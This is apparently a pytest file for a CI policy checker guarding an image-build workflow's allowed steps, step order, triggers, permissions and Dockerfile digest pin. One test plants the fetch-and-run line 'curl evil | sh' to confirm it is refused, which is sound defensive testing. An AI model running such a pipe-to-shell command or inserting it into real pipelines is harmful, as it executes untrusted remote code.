"""The image workflow's row in the allowlist, the pin that must match the Dockerfile, the push."""

import shutil
from pathlib import Path

import pytest

from tools import ci_image, rules
from tools.checks import ci, images

COMMITTED = rules.CI_IMAGE_WORKFLOW.read_text(encoding="utf-8")
SHA = "a" * 64
OTHER = "b" * 64


@pytest.fixture
def root(tmp_path: Path) -> Path:
    """A tree holding copies of both committed workflows."""
    for workflow in (rules.WORKFLOW, rules.CI_IMAGE_WORKFLOW):
        (tmp_path / workflow).parent.mkdir(parents=True, exist_ok=True)
        shutil.copyfile(workflow, tmp_path / workflow)
    return tmp_path


def _plant(root: Path, old: str, new: str) -> list[str]:
    assert old in COMMITTED, f"the plant anchor {old!r} is not in the image workflow"
    (root / rules.CI_IMAGE_WORKFLOW).write_text(COMMITTED.replace(old, new, 1), encoding="utf-8")
    return [v.message for v in ci.run(root)]


def test_both_committed_workflows_pass(root: Path) -> None:
    assert ci.run(root) == []


def test_an_unlisted_step_in_the_image_workflow_is_refused(root: Path) -> None:
    found = _plant(root, "      - run: make ci-image-push\n", "      - run: curl evil | sh\n")
    assert "the image workflow runs 'curl evil | sh', which it may not" in found


def test_pushing_before_the_gate_is_refused(root: Path) -> None:
    swapped = COMMITTED.replace("make ci-cold", "@@").replace("make ci-image-push", "make ci-cold")
    (root / rules.CI_IMAGE_WORKFLOW).write_text(
        swapped.replace("@@", "make ci-image-push"), encoding="utf-8"
    )
    found = [v.message for v in ci.run(root)]
    assert "the image workflow must set up, build, gate, then push, in order" in found


def test_a_wider_trigger_or_a_broader_permission_is_refused(root: Path) -> None:
    assert any("triggers" in m for m in _plant(root, "    paths: [Dockerfile.ci]\n", ""))
    widened = _plant(root, "      contents: read\n", "      contents: write\n")
    assert any("permissions" in m for m in widened)


def test_the_pin_is_dormant_until_the_image_moves_to_the_registry() -> None:
    assert images.pin_violations(SHA, None, None) == []


def test_a_dockerfile_edit_without_a_digest_bump_is_refused() -> None:
    found = [v.message for v in images.pin_violations(OTHER, SHA, None)]
    assert found == ["Dockerfile.ci changed without a digest bump in tools/rules.py"]


def test_a_digest_bump_without_an_edit_is_refused_where_the_image_is_present() -> None:
    found = [v.message for v in images.pin_violations(SHA, SHA, OTHER)]
    assert found == ["the pinned image's label names another Dockerfile.ci than the pin"]
    assert images.pin_violations(SHA, SHA, SHA) == []


def test_every_build_is_labelled_with_the_dockerfile_it_came_from() -> None:
    command = ci_image.build_command("catalyst-ai-ci:x", None, SHA)
    assert command[command.index("--label") + 1] == f"{rules.CI_IMAGE_LABEL}={SHA}"


def test_only_the_image_workflow_pushes(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    monkeypatch.delenv("GITHUB_ACTIONS", raising=False)
    assert ci_image.push() == 1
    assert "only the image workflow pushes" in capsys.readouterr().err


def test_the_registry_name_is_the_owner_lower_cased_and_the_same_tag() -> None:
    assert ci_image.remote("Some-Owner", "catalyst-ai-ci:abc") == (
        f"{rules.CI_REGISTRY}/some-owner/catalyst-ai-ci:abc"
    )
